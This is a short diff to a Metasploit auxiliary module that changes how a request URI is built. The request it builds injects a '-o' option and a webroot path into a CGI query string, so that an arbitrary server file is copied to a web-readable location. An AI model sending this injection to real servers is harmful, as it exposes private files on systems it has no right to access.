@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_raw(
 				{
 					'method'  => 'POST',
-					'uri'     => datastore['URL'] + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
+					'uri'     => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
 				}, 25)
 
 			if (res and res.code == 500)
